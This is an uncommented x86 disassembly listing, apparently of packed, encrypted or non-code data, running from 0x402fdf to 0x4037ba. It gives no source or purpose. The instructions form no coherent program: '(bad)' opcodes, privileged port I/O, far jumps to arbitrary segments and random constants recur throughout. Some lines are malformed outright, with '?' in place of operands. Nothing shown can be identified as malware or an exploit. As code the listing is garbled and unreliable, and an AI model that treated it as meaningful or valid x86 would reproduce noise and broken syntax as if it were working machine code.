  402fdf:	xor    BYTE PTR [ecx],ah
  402fe1:	outs   dx,BYTE PTR ds:[esi]
  402fe2:	mov    eax,ds:0x4113f93b
  402fe7:	mov    bl,0xf5
  402fe9:	aas    
  402fea:	xlat   BYTE PTR ds:[ebx]
  402feb:	adc    DWORD PTR [edx],0xfffffffd
  402fee:	sbb    eax,edx
  402ff0:	mov    eax,0xff2013aa
  402ff5:	sub    dh,al
  402ff7:	pop    ds
  402ff8:	cmp    bh,dh
  402ffa:	pusha  
  402ffb:	ss ins DWORD PTR es:[edi],dx
  402ffd:	fild   DWORD PTR [eax-0x51803c03]
  403003:	shr    BYTE PTR [ecx-0x4167f6fc],cl
  403009:	sub    edi,DWORD PTR [eax]
  40300b:	(bad)  
  40300c:	(bad)  
  40300d:	std    
  40300e:	minps  xmm7,xmm3
  403011:	push   0xb15e9f92
  403016:	mov    cl,BYTE PTR [edx-0x4700095]
  40301c:	sub    BYTE PTR ds:0x976e8de4,bh
  403022:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403023:	push   0x1d
  403025:	jo     0x403061
  403027:	lods   al,BYTE PTR ds:[esi]
  403028:	into   
  403029:	pop    edx
  40302a:	repnz outs dx,DWORD PTR ds:[esi]
  40302c:	call   0x1ba0:0x5d0a8dd
  403033:	in     eax,dx
  403034:	xor    DWORD PTR [eax+0x4],ebx
  403037:	(bad)  
  403038:	mov    ebp,0xca5689ad
  40303d:	int    0x43
  40303f:	retf   0xefdb
  403042:	mov    ecx,0xab2ee06a
  403047:	cmp    ch,BYTE PTR [ecx+edi*1+0x4c]
  40304b:	mov    ebp,DWORD PTR [esi]
  40304d:	or     DWORD PTR [esi+0x76d6a169],esi
  403053:	sbb    al,0x93
  403055:	pusha  
  403056:	cmp    DWORD PTR [ebp-0x45],esp
  403059:	mov    ah,0x6d
  40305b:	inc    ebp
  40305c:	mov    ds:0xe268230c,eax
  403061:	inc    edi
  403062:	rol    DWORD PTR [esi-0x449eb9f4],1
  403068:	mov    ebx,0x4475d262
  40306d:	mov    ebp,0xbf304acb
  403072:	ss push ss
  403074:	repnz mov ecx,0xd5c335a7
  40307a:	imul   esi,DWORD PTR [edx-0x3e],0xdf296e3d
  403081:	cli    
  403082:	mov    ah,0xb
  403084:	push   esp
  403085:	cdq    
  403086:	push   edi
  403087:	popa   
  403088:	adc    dl,BYTE PTR [edi+0x19]
  40308b:	sub    eax,0x900c27b0
  403090:	mov    ch,0xfd
  403092:	sysenter 
  403094:	inc    ecx
  403095:	mov    ebx,0x46e3afd
  40309a:	xchg   esp,eax
  40309b:	fnstcw WORD PTR [esi+0x363ba9dd]
  4030a1:	inc    edi
  4030a2:	pop    ds
  4030a3:	jl     0x40309c
  4030a5:	dec    edx
  4030a6:	xlat   BYTE PTR ds:[ebx]
  4030a7:	mov    ds:0x48c5faac,eax
  4030ac:	je     0x403120
  4030ae:	push   es
  4030af:	arpl   WORD PTR [ebx],bp
  4030b1:	mov    eax,0xe67e7ab8
  4030b6:	out    0x71,al
  4030b8:	cmp    eax,DWORD PTR [edx]
  4030ba:	jns    0x4030f8
  4030bc:	inc    edi
  4030bd:	adc    ebp,ecx
  4030bf:	or     ah,BYTE PTR [eax-0x27]
  4030c2:	dec    esi
  4030c3:	ds mov ebx,0xdbca3b8a
  4030c9:	sub    cl,BYTE PTR [ecx+esi*8]
  4030cc:	inc    eax
  4030cd:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4030cf:	adc    al,0xe0
  4030d1:	test   eax,0x547e35d3
  4030d6:	in     al,0x8e
  4030d8:	es jne 0x403097
  4030db:	scas   eax,DWORD PTR es:[edi]
  4030dc:	cdq    
  4030dd:	push   0x7820346f
  4030e2:	call   0x5a3:0xb35c0692
  4030e9:	das    
  4030ea:	ror    ah,0xa2
  4030ed:	or     al,0x79
  4030ef:	stc    
  4030f0:	fnsave [edx-0x73]
  4030f3:	mov    esi,0xfefd3838
  4030f8:	mov    eax,ds:0x13242d62
  4030fd:	mov    eax,ds:0x28136462
  403102:	mov    bh,0x78
  403104:	aam    0xc8
  403106:	pop    esi
  403107:	daa    
  403108:	or     ebx,DWORD PTR [ecx]
  40310a:	mov    ebp,eax
  40310c:	ret    
  40310d:	iret   
  40310e:	imul   edi,DWORD PTR ds:0xdfafff7b,0x6d
  403115:	and    edi,DWORD PTR [edi-0x6977105b]
  40311b:	sub    ebp,edi
  40311d:	(bad)
  403121:	jo     0x403151
  403123:	add    cl,BYTE PTR ds:0xd6ef6b88
  40312a:	in     al,dx
  40312b:	icebp  
  40312c:	bound  esp,QWORD PTR [esi+0x7f7f5c59]
  403132:	mov    esi,0xee4aa8b7
  403137:	mov    al,bh
  403139:	stos   DWORD PTR es:[edi],eax
  40313a:	aaa    
  40313b:	hlt    
  40313c:	and    BYTE PTR [ebp-0x70776fa1],bh
  403142:	push   eax
  403143:	mov    ch,BYTE PTR [eax]
  403145:	inc    esp
  403146:	outs   dx,DWORD PTR ds:[esi]
  403147:	fist   WORD PTR [esi]
  403149:	xor    bh,BYTE PTR [ebx]
  40314b:	shl    DWORD PTR [edi-0x45eb63a9],cl
  403151:	cmp    BYTE PTR [ebx],cl
  403153:	cmp    al,0x3e
  403155:	shl    bh,1
  403157:	inc    esi
  403158:	sar    BYTE PTR [edx],cl
  40315a:	scas   al,BYTE PTR es:[edi]
  40315b:	in     eax,0xce
  40315d:	cmp    esi,DWORD PTR ds:0x6d07c9b7
  403163:	cdq    
  403164:	push   ebp
  403165:	into   
  403166:	repnz dec edx
  403168:	xchg   esp,eax
  403169:	dec    DWORD PTR [eax+0x742a7d1b]
  40316f:	sbb    eax,0xaa7683fd
  403174:	cmp    esp,DWORD PTR [ecx]
  403176:	lahf   
  403177:	call   0x837aff0b
  40317c:	ret    0x54d6
  40317f:	sbb    al,BYTE PTR [ecx+0x26]
  403182:	push   ecx
  403183:	and    DWORD PTR [esi],ecx
  403185:	into   
  403186:	repnz dec ebp
  403188:	mov    ah,0x22
  40318a:	pusha  
  40318b:	jl     0x403113
  40318d:	sar    dh,1
  40318f:	xchg   esi,eax
  403190:	stos   DWORD PTR es:[edi],eax
  403191:	aad    0xdd
  403193:	inc    ecx
  403194:	fldcw  WORD PTR [esi-0x70]
  403197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403198:	in     al,dx
  403199:	push   edx
  40319a:	mov    ds:0x57628fa,eax
  40319f:	push   edx
  4031a0:	inc    eax
  4031a1:	lods   eax,DWORD PTR ds:[esi]
  4031a2:	push   esp
  4031a3:	ds cmp eax,0xe69a4768
  4031a9:	push   0xf849f662
  4031ae:	dec    eax
  4031af:	mov    eax,0x43250171
  4031b4:	addr16 mov bl,0xb1
  4031b7:	xchg   esi,eax
  4031b8:	fsubr  DWORD PTR [ebp+0x21667]
  4031be:	dec    ebx
  4031bf:	xchg   edx,eax
  4031c0:	sub    eax,0x1e8c3fc6
  4031c5:	or     BYTE PTR [edi],dl
  4031c7:	shl    BYTE PTR [ebp-0x7d2a8f25],cl
  4031cd:	pushf  
  4031ce:	mov    ebp,0x33c6580b
  4031d3:	mov    es,WORD PTR ds:0xac9f3e1b
  4031d9:	dec    edx
  4031da:	sti    
  4031db:	mov    esi,ecx
  4031dd:	retf   0x8d73
  4031e0:	xchg   DWORD PTR [ebx],edx
  4031e2:	scas   al,BYTE PTR es:[edi]
  4031e3:	retf   0x4ff
  4031e6:	add    eax,0x288f6645
  4031eb:	pop    edx
  4031ed:	mov    edx,?
  4031ef:	mov    edx,0xbb038fc7
  4031f4:	xor    DWORD PTR [esi+0x1f3ca7b4],esp
  4031fa:	clc    
  4031fb:	xor    ecx,esi
  4031fd:	mov    bl,0x8e
  4031ff:	jmp    0xbde7746
  403204:	pop    ebp
  403205:	xor    edx,DWORD PTR [ebp-0xc]
  403208:	lahf   
  403209:	inc    esi
  40320a:	push   edx
  40320b:	xchg   BYTE PTR [eax+esi*1-0x51776fb5],bl
  403212:	stos   DWORD PTR es:[edi],eax
  403213:	sub    BYTE PTR ds:0xca131603,al
  403219:	and    eax,0x13d8d633
  40321e:	inc    ecx
  40321f:	xchg   edx,eax
  403220:	add    al,0xb4
  403222:	(bad)  [ecx-0x345f1e0c]
  403228:	mov    esp,0x3bda18f0
  40322d:	lods   al,BYTE PTR ds:[esi]
  40322e:	loop   0x403290
  403230:	cmc    
  403231:	and    eax,0x449b1734
  403236:	mov    ?,WORD PTR [edx+edi*4]
  403239:	mov    ecx,0xb6decdfc
  40323e:	mov    edx,DWORD PTR [ebx]
  403240:	jp     0x40324b
  403242:	add    esi,esp
  403244:	jo     0x4032ac
  403246:	je     0x403279
  403248:	push   edx
  403249:	pusha  
  40324a:	push   ecx
  40324b:	mov    al,ds:0x3728d7c4
  403250:	xchg   ebp,eax
  403251:	das    
  403252:	int3   
  403253:	xor    eax,ebp
  403255:	mov    esp,0xe350717c
  40325a:	cmp    dh,0x32
  40325d:	mov    ah,0x1
  40325f:	sub    cl,BYTE PTR [ecx]
  403261:	pop    ss
  403262:	popa   
  403263:	xchg   DWORD PTR ds:0xf1acfba6,esi
  403269:	mov    ecx,0x7194b7b3
  40326e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40326f:	dec    ebp
  403270:	push   ds
  403271:	call   0x4db4bb0c
  403276:	mov    ebx,eax
  403278:	inc    esi
  403279:	adc    DWORD PTR ss:[eax+0x72],edi
  40327d:	push   ss
  40327e:	daa    
  40327f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403280:	stos   BYTE PTR es:[edi],al
  403281:	cld    
  403282:	out    dx,eax
  403283:	sbb    BYTE PTR [ecx-0x39],ah
  403286:	pcmpeqb mm4,mm5
  403289:	retf   
  40328a:	sahf   
  40328b:	and    esi,edi
  40328d:	jo     0x403288
  40328f:	sbb    ch,bh
  403291:	(bad)  
  403293:	dec    eax
  403294:	rcl    ebp,1
  403296:	pop    esp
  403297:	mov    edi,0x7b70eebf
  40329c:	sbb    dl,BYTE PTR [edx-0x655cca49]
  4032a2:	adc    cl,ch
  4032a4:	call   0xf81b:0x43330ee5
  4032ab:	pusha  
  4032ac:	push   esi
  4032ad:	adc    DWORD PTR [edx],esi
  4032af:	push   ebx
  4032b0:	in     al,dx
  4032b1:	xor    cl,BYTE PTR [esi-0x662311f8]
  4032b7:	(bad)  
  4032b8:	out    dx,eax
  4032b9:	jbe    0x403273
  4032bb:	daa    
  4032bc:	inc    edi
  4032bd:	ret    
  4032be:	mov    bl,0xb1
  4032c0:	stc    
  4032c1:	xor    al,0xd8
  4032c3:	dec    ebp
  4032c4:	adc    dh,bh
  4032c6:	push   esp
  4032c7:	xor    bh,BYTE PTR [ecx+0x6971aeeb]
  4032cd:	pop    edi
  4032ce:	push   es
  4032cf:	out    0x8c,al
  4032d1:	fs fs add al,0xd2
  4032d5:	sahf   
  4032d6:	shl    dl,cl
  4032d8:	punpckldq mm7,DWORD PTR [eax+0x69584df2]
  4032df:	inc    edi
  4032e0:	sbb    dh,BYTE PTR [edi+0x56ff995]
  4032e6:	mov    bh,0x31
  4032e8:	clc    
  4032e9:	inc    edi
  4032ea:	inc    BYTE PTR [edx+0x18]
  4032ed:	in     al,dx
  4032ee:	dec    esi
  4032ef:	pop    ebp
  4032f0:	push   ds
  4032f1:	fidivr DWORD PTR [ebp+edx*4+0x6e]
  4032f5:	sub    ecx,DWORD PTR [edx-0x674d9436]
  4032fb:	mov    ch,0xa4
  4032fd:	loop   0x4032e1
  4032ff:	out    0x8c,eax
  403301:	test   BYTE PTR [esi],ch
  403303:	lock popa 
  403305:	lahf   
  403306:	cmp    al,0xa0
  403308:	hlt    
  403309:	mov    ds:0xf46fc972,eax
  40330e:	pop    edx
  40330f:	popa   
  403310:	int    0xe8
  403312:	jp     0x4032e8
  403314:	xchg   ebx,eax
  403315:	std    
  403316:	jg     0x403305
  403318:	adc    BYTE PTR [ecx-0x8],al
  40331b:	push   cs
  40331c:	out    dx,al
  40331d:	sub    ecx,ebx
  40331f:	xor    BYTE PTR [ecx-0x32],dl
  403322:	pop    ebp
  403323:	sub    eax,0x94495157
  403328:	outs   dx,BYTE PTR ds:[esi]
  403329:	mov    ds:0xc3894d8f,eax
  40332e:	out    0xba,eax
  403330:	(bad)  
  403331:	lods   eax,DWORD PTR gs:[esi]
  403333:	je     0x40336e
  403335:	jle    0x40335b
  403337:	mov    dl,0x1a
  403339:	cmp    ecx,esp
  40333b:	ins    DWORD PTR es:[edi],dx
  40333c:	adc    eax,0x3f898fbb
  403341:	push   eax
  403342:	pop    ebx
  403343:	inc    ebp
  403344:	(bad)  
  403345:	mov    edx,0x19693300
  40334a:	iret   
  40334b:	xchg   ebx,eax
  40334c:	fidiv  WORD PTR [ebp-0x59cda3e5]
  403352:	std    
  403353:	mov    BYTE PTR [ebp+0x66],bh
  403356:	push   0xa2ff466a
  40335b:	jp     0x4032f5
  40335d:	inc    edi
  40335e:	pop    esp
  40335f:	lock pushf 
  403361:	test   BYTE PTR [esi+edx*1+0x31aff63],bl
  403368:	push   ecx
  403369:	pop    ebp
  40336a:	xchg   ah,al
  40336c:	add    eax,0x3d893230
  403371:	lods   al,BYTE PTR ds:[esi]
  403372:	hlt    
  403373:	fucom  st(0)
  403375:	push   edi
  403376:	mov    ecx,DWORD PTR [ecx]
  403378:	stc    
  403379:	in     al,0x2d
  40337b:	xor    BYTE PTR [ecx],0xb8
  40337e:	xchg   eax,edx
  403380:	jo     0x40336d
  403382:	sub    BYTE PTR ss:[ecx],dh
  403385:	lahf   
  403386:	dec    ecx
  403387:	scas   eax,DWORD PTR es:[edi]
  403388:	adc    BYTE PTR [edx+0x42],al
  40338b:	cdq    
  40338c:	jnp    0x4033a4
  40338e:	fild   DWORD PTR [ebx+ebp*4-0x47]
  403392:	in     al,dx
  403393:	lods   al,BYTE PTR ds:[esi]
  403394:	jp     0x403410
  403396:	loop   0x403382
  403398:	in     eax,dx
  403399:	sbb    cl,ah
  40339b:	outs   dx,BYTE PTR ds:[esi]
  40339c:	pop    edx
  40339d:	dec    edx
  40339e:	xlat   BYTE PTR ds:[ebx]
  40339f:	or     DWORD PTR [edi],0x806f970
  4033a5:	mov    edi,0x96ca4715
  4033aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033ab:	retf   
  4033ac:	loope  0x4033b2
  4033ae:	jns    0x403374
  4033b0:	cs scas eax,DWORD PTR es:[edi]
  4033b2:	icebp  
  4033b3:	ret    0x2d1e
  4033b6:	test   al,0x84
  4033b8:	sub    eax,0x76ebe06e
  4033bd:	inc    ecx
  4033be:	pop    ebx
  4033bf:	mov    ebx,0x962a3c72
  4033c4:	pop    esi
  4033c5:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033c7:	jecxz  0x403448
  4033c9:	push   esp
  4033ca:	push   0x63f07437
  4033cf:	mov    esp,ecx
  4033d1:	inc    edx
  4033d2:	(bad)  
  4033d3:	(bad)  
  4033d4:	or     ecx,DWORD PTR [ecx-0x28]
  4033d7:	je     0x4033f3
  4033d9:	js     0x40340d
  4033db:	and    DWORD PTR [ecx-0x51],esi
  4033de:	retf   
  4033df:	push   eax
  4033e0:	mov    ebx,0x794b1a2f
  4033e5:	pushf  
  4033e6:	mov    BYTE PTR [ecx-0x6d3b1422],ah
  4033ec:	cdq    
  4033ed:	pop    ecx
  4033ee:	mov    ebx,0xcba85d8f
  4033f3:	in     al,dx
  4033f4:	adc    eax,DWORD PTR [ecx+edx*1-0x65]
  4033f8:	push   edx
  4033f9:	sub    BYTE PTR [edi-0x74133749],ah
  4033ff:	out    0x2f,eax
  403401:	imul   esp,DWORD PTR [ecx-0x4916926],0x7488d175
  40340b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40340c:	(bad)  [edx+0x10]
  40340f:	or     eax,0xaaf88fd6
  403414:	imul   edi,DWORD PTR [ebp+0x33],0xa3a3481a
  40341b:	not    ebp
  40341d:	adc    BYTE PTR [eax],ah
  40341f:	xor    eax,DWORD PTR [esi+eiz*4]
  403422:	mov    cl,0x5f
  403424:	in     eax,0x94
  403426:	stc    
  403427:	lea    ebp,[ebx-0x2cfd8dd7]
  40342d:	or     eax,DWORD PTR [edx+0x7d]
  403430:	ins    BYTE PTR es:[edi],dx
  403431:	jle    0x4033cf
  403433:	ins    DWORD PTR es:[edi],dx
  403434:	and    al,0x5c
  403436:	ja     0x40343f
  403438:	dec    ecx
  403439:	fbstp  TBYTE PTR [eax]
  40343b:	in     eax,dx
  40343c:	outs   dx,DWORD PTR ds:[esi]
  40343d:	loope  0x40341c
  40343f:	arpl   dx,cx
  403441:	jnp    0x403412
  403443:	add    DWORD PTR [ecx-0x17d702b3],ebp
  403449:	das    
  40344a:	nop
  40344b:	test   al,0x69
  40344d:	retf   
  40344e:	test   eax,0x8cd4bc8
  403453:	push   edx
  403454:	repnz shl ah,cl
  403457:	jnp    0x4034d7
  403459:	ja     0x4034a1
  40345b:	push   esp
  40345c:	shl    BYTE PTR [ecx+ebx*8],1
  40345f:	inc    edi
  403460:	pop    ebx
  403461:	lods   eax,DWORD PTR ds:[esi]
  403462:	pop    ecx
  403463:	push   ebp
  403464:	scas   eax,DWORD PTR es:[edi]
  403465:	add    eax,0x71c34636
  40346a:	test   DWORD PTR [edi-0x61],ebp
  40346d:	xor    edx,DWORD PTR [edi]
  40346f:	das    
  403470:	cmp    BYTE PTR [ebx-0x7695e3e6],dh
  403476:	sbb    eax,0x5740dada
  40347b:	lods   al,BYTE PTR ds:[esi]
  40347c:	loopne 0x403496
  40347e:	popa   
  40347f:	js     0x40342a
  403481:	dec    esi
  403482:	lods   al,BYTE PTR ds:[esi]
  403483:	mov    ds:0xac0a05d5,al
  403488:	xor    BYTE PTR [edx+0x5bfcd79],al
  40348e:	addr16 inc eax
  403490:	and    BYTE PTR [esi],dh
  403492:	stos   BYTE PTR es:[edi],al
  403493:	adc    DWORD PTR [ebx+0x1b],0xffffffc3
  403497:	jg     0x403510
  403499:	xor    al,BYTE PTR [esp+esi*4]
  40349c:	inc    ebp
  40349d:	push   ss
  40349e:	pop    ebp
  40349f:	push   es
  4034a0:	jmp    0x40351c
  4034a2:	(bad)  
  4034a3:	jb     0x40344c
  4034a5:	loopne 0x4034b7
  4034a7:	ffreep st(6)
  4034a9:	daa    
  4034aa:	add    cl,ah
  4034ac:	push   esp
  4034ad:	inc    esi
  4034ae:	shr    BYTE PTR [ebx],0x28
  4034b1:	cld    
  4034b2:	dec    eax
  4034b3:	test   eax,0x78d9ed2b
  4034b8:	jle    0x403454
  4034ba:	clc    
  4034bb:	pop    ss
  4034bc:	cmp    eax,0xb73e78a
  4034c1:	adc    ebx,DWORD PTR [eax-0x75193900]
  4034c7:	xchg   BYTE PTR [eax+0x40],dh
  4034ca:	pop    edi
  4034cb:	add    BYTE PTR [ebp+0x5afb32e5],ah
  4034d1:	push   cs
  4034d2:	int    0x3c
  4034d4:	adc    bl,BYTE PTR [esi+0x5f70c6b4]
  4034da:	jmp    0xfd775c43
  4034df:	mov    ch,0xc2
  4034e1:	and    eax,0xf3ab0356
  4034e6:	and    BYTE PTR [eax],bh
  4034e8:	sbb    al,0x2f
  4034ea:	pushf  
  4034eb:	add    ebx,DWORD PTR [edx]
  4034ed:	rcr    BYTE PTR [ebp-0x63f44fd6],0x4
  4034f4:	cdq    
  4034f5:	push   esi
  4034f6:	fbld   TBYTE PTR [ebp+0xe]
  4034f9:	sahf   
  4034fa:	in     al,dx
  4034fb:	dec    esp
  4034fc:	daa    
  4034fd:	int    0xad
  4034ff:	push   ebp
  403500:	lods   al,BYTE PTR ds:[esi]
  403501:	push   ds
  403502:	div    BYTE PTR [ebx-0x5a]
  403505:	ins    DWORD PTR es:[edi],dx
  403506:	and    eax,0x81a296b1
  40350b:	in     eax,0xbd
  40350d:	aam    0xd7
  40350f:	jbe    0x403493
  403511:	mov    al,ds:0xd05ebba3
  403516:	add    eax,0x6cacce30
  40351b:	dec    ebp
  40351c:	adc    eax,DWORD PTR ss:[ecx+0x44]
  403520:	xchg   esi,eax
  403521:	jne    0x403592
  403523:	imul   edx,DWORD PTR [edi+ebx*8],0xffffffa5
  403527:	push   ds
  403528:	mov    eax,ds:0x5b398b27
  40352d:	cmp    al,0x33
  40352f:	xor    BYTE PTR [edi+eax*4+0x16],cl
  403533:	fsubp  st(7),st
  403535:	test   cl,cl
  403537:	enter  0x3708,0xe0
  40353b:	dec    edx
  40353c:	pop    esi
  40353d:	sbb    BYTE PTR [ebp-0x35b032cb],dl
  403543:	imul   ecx,DWORD PTR [esi-0x4bf79995],0xffffffb4
  40354a:	or     DWORD PTR [ebx],esp
  40354c:	jb     0x403528
  40354e:	jmp    0x4034f7
  403550:	push   esi
  403551:	sar    ebp,1
  403553:	or     BYTE PTR [ebp-0x5c9bebbf],bh
  403559:	xlat   BYTE PTR ds:[ebx]
  40355a:	mov    ds:0xd15250dd,al
  40355f:	mov    edi,DWORD PTR [edx+ebx*4-0x3c]
  403563:	lock loop 0x40350a
  403566:	mov    esp,0x1e1a7704
  40356b:	pop    es
  40356c:	test   eax,0xeebc7170
  403571:	in     al,0x64
  403573:	jae    0x4035ee
  403575:	or     DWORD PTR [ebp+0x75],esp
  403578:	imul   ecx,DWORD PTR [esi],0x7c
  40357b:	sbb    eax,0x5837f8bf
  403580:	into   
  403581:	shr    BYTE PTR [edx+0x41],1
  403584:	jmp    0x403531
  403586:	sub    eax,0xa642e356
  40358b:	mov    dl,0xd7
  40358d:	jge    0x403549
  40358f:	sti    
  403590:	push   es
  403591:	dec    DWORD PTR [edi-0x7f]
  403594:	ud2    
  403596:	fstp   st(5)
  403598:	dec    esp
  403599:	pop    eax
  40359a:	in     eax,dx
  40359b:	test   al,0xf1
  40359d:	or     BYTE PTR [ecx+ebp*8-0x26],dh
  4035a1:	in     eax,dx
  4035a2:	adc    BYTE PTR [edi],al
  4035a4:	icebp  
  4035a5:	fdivr  DWORD PTR [ecx]
  4035a7:	mov    ch,0x25
  4035a9:	loopne 0x40361e
  4035ab:	mov    al,ds:0xa76e08b7
  4035b0:	and    edi,0x6f56148a
  4035b6:	mov    ah,0xac
  4035b8:	loope  0x40356c
  4035ba:	aas    
  4035bb:	push   ecx
  4035bc:	pusha  
  4035bd:	inc    esp
  4035be:	cdq    
  4035bf:	xor    dh,BYTE PTR [eax+eiz*4-0x6c]
  4035c3:	add    eax,eax
  4035c5:	(bad)
  4035c8:	jmp    0xe179:0xbc1866cf
  4035cf:	(bad)  
  4035d0:	loopne 0x4035aa
  4035d2:	popf   
  4035d3:	das    
  4035d4:	sti    
  4035d5:	mov    dh,0x48
  4035d7:	mov    edx,0xa92c5dd7
  4035dc:	inc    edi
  4035dd:	enter  0xd56e,0x8f
  4035e1:	stc    
  4035e2:	inc    ebp
  4035e3:	inc    edx
  4035e4:	ret    0x89
  4035e7:	int    0x0
  4035e9:	popa   
  4035ea:	daa    
  4035eb:	pop    edi
  4035ec:	fcmovnb st,st(1)
  4035ee:	add    edi,esi
  4035f0:	inc    eax
  4035f1:	xor    al,BYTE PTR [ebx-0x1586d78]
  4035f7:	sbb    DWORD PTR ds:0x6132c1b2,ecx
  4035fd:	mov    ds:0x3f339a92,al
  403602:	xor    edx,DWORD PTR [ebp-0x51ca3a11]
  403608:	and    eax,ebp
  40360a:	sbb    bl,BYTE PTR [esi-0x16]
  40360d:	inc    edx
  40360e:	fadd   DWORD PTR [ebx+eax*4]
  403611:	xchg   ebx,eax
  403612:	adc    eax,0x89762f2a
  403617:	cmc    
  403618:	pop    ds
  403619:	mov    ds:0x31d2dfc6,al
  40361e:	mov    ch,0x4e
  403620:	aam    0x67
  403622:	gs jmp 0x1bf3:0xc7ec1861
  40362a:	dec    edx
  40362b:	cwde   
  40362c:	pop    ebx
  40362d:	inc    ebp
  40362e:	mov    edx,0xac5a101b
  403633:	inc    esi
  403634:	pop    ebx
  403635:	inc    ebx
  403636:	fmul   DWORD PTR [ebx-0x80]
  403639:	jp     0x40367c
  40363b:	mov    ds:0x1629414,al
  403640:	loope  0x4035cc
  403642:	daa    
  403643:	dec    eax
  403644:	cmp    edx,DWORD PTR [edx+0xdc82287]
  40364a:	inc    ebx
  40364b:	ret    
  40364c:	mov    dl,0x2c
  40364e:	jge    0x40364e
  403650:	in     eax,dx
  403651:	je     0x40361f
  403653:	pop    ds
  403654:	dec    eax
  403655:	jg     0x403692
  403657:	int    0x40
  403659:	jno    0x4036b3
  40365b:	push   esp
  40365c:	mov    WORD PTR [edx-0x1f520fa0],ds
  403662:	cmp    eax,0x81b36dd6
  403667:	ins    DWORD PTR es:[edi],dx
  403668:	sub    dh,BYTE PTR [eax-0x4a83aef5]
  40366e:	adc    edi,DWORD PTR [edi-0xd3c2b35]
  403674:	retf   0x5a42
  403677:	xor    al,0x96
  403679:	xchg   DWORD PTR [edx+ebx*2+0x52],edi
  40367d:	dec    ebp
  40367e:	push   ss
  40367f:	in     eax,dx
  403680:	inc    esp
  403681:	pop    ds
  403682:	idiv   ecx
  403684:	pop    eax
  403685:	popa   
  403686:	mov    cl,0x72
  403688:	aam    0xc2
  40368a:	push   0xa93bdf47
  40368f:	(bad)  
  403690:	mov    ebx,0x5f2f6f9d
  403695:	fisubr WORD PTR [ebp-0x7a]
  403698:	jmp    FWORD PTR [esp+edx*2-0x7ae76cd0]
  40369f:	push   ss
  4036a0:	(bad)  
  4036a1:	pop    esp
  4036a2:	and    al,BYTE PTR [ebx+esi*2-0x639eab4d]
  4036a9:	std    
  4036aa:	mov    dh,BYTE PTR [ebx]
  4036ac:	mov    cl,0x3c
  4036ae:	xchg   esp,eax
  4036af:	cld    
  4036b0:	das    
  4036b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036b2:	push   es
  4036b3:	and    bh,bh
  4036b5:	add    eax,0x471baa11
  4036ba:	ret    
  4036bb:	out    dx,al
  4036bc:	call   0xb19ce78a
  4036c1:	mov    eax,ecx
  4036c3:	xchg   ebx,eax
  4036c4:	ins    DWORD PTR es:[edi],dx
  4036c5:	lock cwde 
  4036c7:	jecxz  0x4036fd
  4036c9:	mov    eax,ds:0x74dfa305
  4036ce:	adc    DWORD PTR [edx-0x19],ecx
  4036d1:	xlat   BYTE PTR ds:[ebx]
  4036d2:	jne    0x4036e2
  4036d4:	fsub   QWORD PTR [ebx]
  4036d6:	adc    al,0xb1
  4036d8:	les    edx,FWORD PTR [edx-0x6]
  4036db:	push   0xffffffc1
  4036dd:	mov    ah,0xda
  4036df:	or     al,0x89
  4036e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036e2:	(bad)  [edi+0x7d0eb6f0]
  4036e8:	or     edi,DWORD PTR ds:0x57644e89
  4036ee:	bound  ebp,QWORD PTR [eax+0x4806d4a4]
  4036f4:	in     al,0xee
  4036f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036f7:	adc    bl,BYTE PTR [ecx+0x3d]
  4036fa:	jl     0x4036fc
  4036fc:	inc    ecx
  4036fd:	lods   eax,DWORD PTR ds:[esi]
  4036fe:	jle    0x4036fc
  403700:	loop   0x403739
  403702:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  403704:	and    BYTE PTR [ecx+0x31],dh
  403707:	pop    eax
  403708:	dec    edx
  403709:	cmp    eax,0xde750712
  40370e:	xor    bl,BYTE PTR [ebx+0x2d]
  403711:	mov    ds:0x8c2c976,eax
  403716:	sbb    DWORD PTR [eax-0x724115c3],edi
  40371c:	(bad)  
  40371d:	mov    ebx,0x7234c6dc
  403722:	mov    ds:0x786766d1,al
  403727:	sbb    ebx,esi
  403729:	xor    al,0xeb
  40372b:	lahf   
  40372c:	pop    ebp
  40372d:	sub    DWORD PTR [ebx+0x4a5bf90e],ebx
  403733:	and    BYTE PTR [edi+0x263d935],al
  403739:	dec    ebx
  40373a:	stc    
  40373b:	mov    ebx,edx
  40373d:	or     dl,BYTE PTR [ecx+eax*4-0x93f6700]
  403744:	test   al,0xd3
  403746:	sbb    eax,DWORD PTR [edi-0x657c030e]
  40374c:	push   edi
  40374d:	xchg   esp,eax
  40374e:	xor    edx,DWORD PTR [edx-0x4bd661fd]
  403754:	leave  
  403755:	das    
  403756:	push   es
  403757:	jo     0x4037b3
  403759:	data16 jns 0x40376c
  40375c:	mov    BYTE PTR [ebp+0x73],al
  40375f:	jnp    0x4037c9
  403761:	pop    es
  403762:	ret    0x5b5a
  403765:	jmp    0x3bf67114
  40376a:	dec    edi
  40376b:	xchg   esi,eax
  40376c:	addr16 inc edi
  40376e:	loope  0x4037bc
  403770:	test   dh,al
  403772:	cs ins DWORD PTR es:[edi],dx
  403774:	jle    0x4037d1
  403776:	out    dx,eax
  403777:	les    esp,FWORD PTR [ebx+0x5d]
  40377a:	xor    edx,esp
  40377c:	lock or al,0x78
  40377f:	mov    ebx,0xb6bdc387
  403784:	sub    bl,BYTE PTR ds:0x479100bc
  40378a:	inc    edx
  40378b:	pushf  
  40378c:	mov    ebp,0x17077e7b
  403791:	int    0x6a
  403793:	pop    edx
  403794:	inc    esi
  403795:	push   0xffffffe3
  403797:	and    dh,BYTE PTR [edi]
  403799:	cwde   
  40379a:	inc    edx
  40379b:	push   eax
  40379c:	fcomp  QWORD PTR [edx+0x2a9b6e0d]
  4037a2:	in     al,0xc4
  4037a4:	mov    fs,eax
  4037a6:	pop    esp
  4037a7:	xchg   edx,eax
  4037a8:	stos   DWORD PTR es:[edi],eax
  4037a9:	pushfw 
  4037ab:	or     eax,0x3d692253
  4037b0:	push   edi
  4037b1:	in     eax,dx
  4037b2:	int    0xda
  4037b4:	std    
  4037b5:	mov    ecx,0xd4351069
  4037ba:	inc    esp
